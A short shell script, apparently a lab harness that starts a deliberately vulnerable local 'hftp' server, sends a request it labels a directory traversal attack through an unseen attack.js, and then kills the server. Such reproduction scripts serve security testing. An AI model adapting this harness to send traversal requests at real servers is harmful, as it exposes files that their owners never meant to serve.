# Colors for output
RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

### Step 1: Start the server
echo -e "\t[${GREEN}start vulnerable server${NC}]: ${BLUE}hftp${NC}"
node scripts/start-server.js &

# Store the process ID of the server
vulnpid=$!

### Step 2: Wait for the server to get started
sleep 2  
echo -e "\t[${GREEN}server root directory${NC}]: `pwd`"

### Step 3: Perform directory traversal attack 
ATTACK_PATH1="http://localhost:8888/general/reports.txt"

echo -e "\t[${GREEN}directory traversal attack${NC}]: ${BLUE}$ATTACK_PATH1${NC}"
echo -e "\t[${GREEN}directory traversal request response${NC}]:"
node scripts/attack.js "$ATTACK_PATH1"

### Step 4: Clean up the vulnerable server process
kill -9 $vulnpid
